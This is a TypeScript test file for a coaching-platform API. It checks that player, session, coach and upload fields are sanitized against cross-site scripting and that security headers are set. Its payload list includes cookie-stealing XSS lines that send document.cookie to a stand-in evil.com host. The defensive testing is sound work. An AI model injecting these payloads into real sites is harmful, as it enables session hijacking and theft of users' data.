/**
 * XSS (Cross-Site Scripting) Security Tests
 *
 * Tests to ensure all user inputs are properly sanitized against XSS attacks.
 *
 * Tests cover:
 * 1. Script tag injection
 * 2. Event handler injection
 * 3. HTML entity encoding
 * 4. URL-based XSS
 * 5. JSON-based XSS
 * 6. Stored XSS prevention
 */

import { FastifyInstance } from 'fastify';
import {
  getTestApp,
  getTestPrisma,
  closeTestConnections,
  registerTestUser,
  authenticatedRequest,
  uniqueEmail,
  uniqueString,
} from '../helpers';

describe('XSS Input Sanitization Security Tests', () => {
  let app: FastifyInstance;
  let adminToken: string;
  let tenantId: string;

  // Common XSS attack payloads
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg/onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<body onload=alert("XSS")>',
    '<input type="text" value="XSS" onfocus="alert(\'XSS\')">',
    '<a href="javascript:alert(\'XSS\')">Click me</a>',
    '<div onmouseover="alert(\'XSS\')">Hover me</div>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<img src="x" onerror="this.src=\'http://evil.com/?\'+document.cookie">',
    '<ScRiPt>alert("XSS")</ScRiPt>',
    '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
    '<<SCRIPT>alert("XSS");//<</SCRIPT>',
    '<script>document.location="http://evil.com/cookie.php?c="+document.cookie</script>',
    '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
    '<IMG SRC=javascript:alert(\'XSS\')>',
    '<BODY ONLOAD=alert(\'XSS\')>',
    '<BGSOUND SRC="javascript:alert(\'XSS\');">',
    '<BR SIZE="&{alert(\'XSS\')}">',
    '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
    '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
    '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
    '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',
    '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS',
    '<IMG SRC=\' &#14;  javascript:alert("XSS");\'>',
    '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
  ];

  beforeAll(async () => {
    app = await getTestApp();

    const admin = await registerTestUser(app, {
      email: uniqueEmail('xss-test-admin'),
      password: 'TestPassword123!',
      firstName: 'XSS',
      lastName: 'Admin',
      organizationName: uniqueString('XSS Test Org'),
      role: 'admin',
    });

    adminToken = admin.accessToken;
    tenantId = admin.tenantId;
  });

  afterAll(async () => {
    await closeTestConnections();
  });

  describe('Script Tag Injection Prevention', () => {
    test.each(xssPayloads)(
      'should sanitize XSS payload in player name: %s',
      async (payload) => {
        const response = await authenticatedRequest(
          app,
          'POST',
          '/api/v1/players',
          adminToken,
          {
            firstName: payload,
            lastName: 'Test',
            email: uniqueEmail('xsstest'),
            dateOfBirth: '2000-01-01',
          }
        );

        // Should either reject (validation) or sanitize
        if (response.statusCode === 201) {
          const body = JSON.parse(response.body);
          const firstName = body.data.player.firstName;

          // Should not contain executable script tags
          expect(firstName).not.toMatch(/<script[\s\S]*?>[\s\S]*?<\/script>/gi);
          expect(firstName).not.toMatch(/javascript:/gi);
          expect(firstName).not.toMatch(/on\w+\s*=/gi); // Event handlers
        } else {
          // If rejected, status should be 400 (validation error)
          expect([400, 422]).toContain(response.statusCode);
        }
      }
    );

    test.each(xssPayloads)(
      'should sanitize XSS payload in session description: %s',
      async (payload) => {
        const response = await authenticatedRequest(
          app,
          'POST',
          '/api/v1/sessions',
          adminToken,
          {
            title: 'Test Session',
            description: payload,
            date: '2024-12-25',
            duration: 60,
          }
        );

        if (response.statusCode === 201) {
          const body = JSON.parse(response.body);
          const description = body.data.session?.description || '';

          expect(description).not.toMatch(/<script[\s\S]*?>/gi);
          expect(description).not.toMatch(/javascript:/gi);
        }
      }
    );
  });

  describe('Event Handler Injection Prevention', () => {
    const eventHandlerPayloads = [
      'test" onload="alert(1)"',
      'test" onclick="alert(1)"',
      'test" onmouseover="alert(1)"',
      'test" onfocus="alert(1)"',
      'test" onerror="alert(1)"',
    ];

    test.each(eventHandlerPayloads)(
      'should prevent event handler injection: %s',
      async (payload) => {
        const response = await authenticatedRequest(
          app,
          'POST',
          '/api/v1/players',
          adminToken,
          {
            firstName: payload,
            lastName: 'Test',
            email: uniqueEmail('eventtest'),
            dateOfBirth: '2000-01-01',
          }
        );

        if (response.statusCode === 201) {
          const body = JSON.parse(response.body);
          const firstName = body.data.player.firstName;

          // Should not contain event handlers
          expect(firstName).not.toMatch(/on\w+\s*=/gi);
          expect(firstName).not.toMatch(/onload|onclick|onmouseover|onfocus|onerror/gi);
        }
      }
    );
  });

  describe('HTML Entity Encoding', () => {
    test('should properly encode HTML special characters', async () => {
      const response = await authenticatedRequest(
        app,
        'POST',
        '/api/v1/players',
        adminToken,
        {
          firstName: 'Test<>&"\'',
          lastName: 'User',
          email: uniqueEmail('htmltest'),
          dateOfBirth: '2000-01-01',
        }
      );

      if (response.statusCode === 201) {
        const body = JSON.parse(response.body);
        const firstName = body.data.player.firstName;

        // Characters should be either escaped or rejected
        // If stored as-is, they should be properly escaped when returned
        expect(firstName).toBeDefined();
      }
    });

    test('should handle angle brackets in text fields', async () => {
      const response = await authenticatedRequest(
        app,
        'POST',
        '/api/v1/sessions',
        adminToken,
        {
          title: 'Test Session',
          description: 'Score: 5<10 or 10>5',
          date: '2024-12-25',
          duration: 60,
        }
      );

      if (response.statusCode === 201) {
        const body = JSON.parse(response.body);
        const description = body.data.session?.description;

        // Legitimate use of < and > should be handled safely
        expect(description).toBeDefined();
      }
    });
  });

  describe('Stored XSS Prevention', () => {
    test('should not execute stored XSS in player bio', async () => {
      const prisma = getTestPrisma();

      // Create player with XSS in bio
      const createResponse = await authenticatedRequest(
        app,
        'POST',
        '/api/v1/players',
        adminToken,
        {
          firstName: 'Bio',
          lastName: 'Test',
          email: uniqueEmail('biotest'),
          dateOfBirth: '2000-01-01',
          bio: '<script>alert("Stored XSS")</script>',
        }
      );

      if (createResponse.statusCode === 201) {
        const createBody = JSON.parse(createResponse.body);
        const playerId = createBody.data.player.id;

        // Retrieve player data
        const getResponse = await authenticatedRequest(
          app,
          'GET',
          `/api/v1/players/${playerId}`,
          adminToken
        );

        expect(getResponse.statusCode).toBe(200);
        const getBody = JSON.parse(getResponse.body);
        const bio = getBody.data.player?.bio || '';

        // Bio should not contain executable script
        expect(bio).not.toMatch(/<script[\s\S]*?>/gi);

        // Cleanup
        await prisma.player.delete({ where: { id: playerId } });
      }
    });

    test('should not execute stored XSS in coach specialization', async () => {
      const prisma = getTestPrisma();

      // Create user first
      const user = await prisma.user.create({
        data: {
          tenantId,
          email: uniqueEmail('coachxss'),
          passwordHash: 'hashed',
          firstName: 'Coach',
          lastName: 'XSSTest',
          role: 'coach',
        },
      });

      // Create coach with XSS in specializations
      const coach = await prisma.coach.create({
        data: {
          userId: user.id,
          tenantId,
          firstName: 'Test',
          lastName: 'Coach',
          email: 'xss-coach@test.com',
          specializations: ['<img src=x onerror=alert(1)>'],
        },
      });

      // Retrieve coach data
      const response = await authenticatedRequest(
        app,
        'GET',
        `/api/v1/coaches/${coach.id}`,
        adminToken
      );

      expect(response.statusCode).toBe(200);
      const body = JSON.parse(response.body);
      const specialization = body.data.coach?.specialization || '';

      // Should not contain executable code
      expect(specialization).not.toMatch(/<img[\s\S]*?onerror/gi);

      // Cleanup
      await prisma.coach.delete({ where: { id: coach.id } });
      await prisma.user.delete({ where: { id: user.id } });
    });
  });

  describe('JSON Response XSS Prevention', () => {
    test('should properly escape XSS in JSON responses', async () => {
      const response = await authenticatedRequest(
        app,
        'POST',
        '/api/v1/players',
        adminToken,
        {
          firstName: '"></script><script>alert(1)</script>',
          lastName: 'Test',
          email: uniqueEmail('jsontest'),
          dateOfBirth: '2000-01-01',
        }
      );

      // Response should be valid JSON
      expect(() => JSON.parse(response.body)).not.toThrow();

      if (response.statusCode === 201) {
        // JSON encoding should prevent script execution
        expect(response.headers['content-type']).toMatch(/application\/json/);
      }
    });

    test('should set proper Content-Type headers', async () => {
      const response = await authenticatedRequest(
        app,
        'GET',
        '/api/v1/players',
        adminToken
      );

      expect(response.statusCode).toBe(200);
      expect(response.headers['content-type']).toMatch(/application\/json/);
      // Should not be text/html which could execute scripts
      expect(response.headers['content-type']).not.toMatch(/text\/html/);
    });
  });

  describe('URL-Based XSS Prevention', () => {
    test('should sanitize javascript: protocol in URLs', async () => {
      const response = await authenticatedRequest(
        app,
        'POST',
        '/api/v1/players',
        adminToken,
        {
          firstName: 'URL',
          lastName: 'Test',
          email: uniqueEmail('urltest'),
          dateOfBirth: '2000-01-01',
          website: 'javascript:alert(1)',
        }
      );

      if (response.statusCode === 201) {
        const body = JSON.parse(response.body);
        const website = body.data.player?.website || '';

        // Should not contain javascript: protocol
        expect(website.toLowerCase()).not.toMatch(/javascript:/);
      } else {
        // Should reject invalid URL
        expect([400, 422]).toContain(response.statusCode);
      }
    });

    test('should sanitize data: protocol in URLs', async () => {
      const response = await authenticatedRequest(
        app,
        'POST',
        '/api/v1/players',
        adminToken,
        {
          firstName: 'Data',
          lastName: 'Test',
          email: uniqueEmail('datatest'),
          dateOfBirth: '2000-01-01',
          website: 'data:text/html,<script>alert(1)</script>',
        }
      );

      if (response.statusCode !== 201) {
        expect([400, 422]).toContain(response.statusCode);
      }
    });
  });

  describe('Rich Text Input Sanitization', () => {
    test('should sanitize HTML in session notes', async () => {
      const response = await authenticatedRequest(
        app,
        'POST',
        '/api/v1/sessions',
        adminToken,
        {
          title: 'Rich Text Test',
          description: '<p>Normal text</p><script>alert(1)</script><p>More text</p>',
          date: '2024-12-25',
          duration: 60,
        }
      );

      if (response.statusCode === 201) {
        const body = JSON.parse(response.body);
        const description = body.data.session?.description || '';

        // Should preserve safe HTML but remove scripts
        expect(description).not.toMatch(/<script/gi);
        // May or may not preserve <p> tags depending on sanitization strategy
      }
    });

    test('should handle nested XSS attempts', async () => {
      const response = await authenticatedRequest(
        app,
        'POST',
        '/api/v1/sessions',
        adminToken,
        {
          title: 'Nested XSS',
          description: '<div><span><script>alert(1)</script></span></div>',
          date: '2024-12-25',
          duration: 60,
        }
      );

      if (response.statusCode === 201) {
        const body = JSON.parse(response.body);
        const description = body.data.session?.description || '';

        expect(description).not.toMatch(/<script/gi);
      }
    });
  });

  describe('HTTP Headers Security', () => {
    test('should set X-Content-Type-Options header', async () => {
      const response = await authenticatedRequest(
        app,
        'GET',
        '/api/v1/players',
        adminToken
      );

      expect(response.statusCode).toBe(200);
      expect(response.headers['x-content-type-options']).toBe('nosniff');
    });

    test('should set X-Frame-Options header', async () => {
      const response = await authenticatedRequest(
        app,
        'GET',
        '/api/v1/players',
        adminToken
      );

      expect(response.statusCode).toBe(200);
      // Should prevent clickjacking
      expect(response.headers['x-frame-options']).toMatch(/DENY|SAMEORIGIN/i);
    });

    test('should set Content-Security-Policy header', async () => {
      const response = await authenticatedRequest(
        app,
        'GET',
        '/api/v1/players',
        adminToken
      );

      expect(response.statusCode).toBe(200);
      // CSP should be set by Helmet middleware
      const csp = response.headers['content-security-policy'];
      if (csp) {
        expect(csp).toContain("default-src 'self'");
      }
    });
  });

  describe('DOM-Based XSS Prevention', () => {
    test('should safely handle special characters in search results', async () => {
      const response = await authenticatedRequest(
        app,
        'GET',
        '/api/v1/players?search=<script>alert(1)</script>',
        adminToken
      );

      expect(response.statusCode).toBe(200);
      const body = JSON.parse(response.body);

      // Response should be valid JSON without script execution
      expect(body).toBeDefined();
    });

    test('should safely return user-provided data in errors', async () => {
      const maliciousEmail = '<script>alert(1)</script>@test.com';
      const response = await authenticatedRequest(
        app,
        'POST',
        '/api/v1/players',
        adminToken,
        {
          firstName: 'Test',
          lastName: 'User',
          email: maliciousEmail,
          dateOfBirth: '2000-01-01',
        }
      );

      // Should reject invalid email
      expect([400, 422]).toContain(response.statusCode);

      const body = JSON.parse(response.body);
      // Error message should not contain executable code
      const errorString = JSON.stringify(body);
      expect(errorString).not.toMatch(/<script/gi);
    });
  });

  describe('File Upload XSS Prevention', () => {
    test('should sanitize malicious filenames', async () => {
      // Test with malicious filename
      const response = await authenticatedRequest(
        app,
        'POST',
        '/api/v1/media/upload',
        adminToken,
        {
          filename: '<script>alert(1)</script>.jpg',
          contentType: 'image/jpeg',
        }
      );

      // Should either reject or sanitize filename
      if (response.statusCode === 200 || response.statusCode === 201) {
        const body = JSON.parse(response.body);
        const filename = body.data?.filename || '';

        expect(filename).not.toMatch(/<script/gi);
      }
    });

    test('should validate file content types', async () => {
      const response = await authenticatedRequest(
        app,
        'POST',
        '/api/v1/media/upload',
        adminToken,
        {
          filename: 'test.html',
          contentType: 'text/html',
        }
      );

      // Should reject HTML uploads that could contain XSS (or endpoint doesn't exist - also secure)
      expect([400, 404, 415, 422]).toContain(response.statusCode);
    });
  });
});
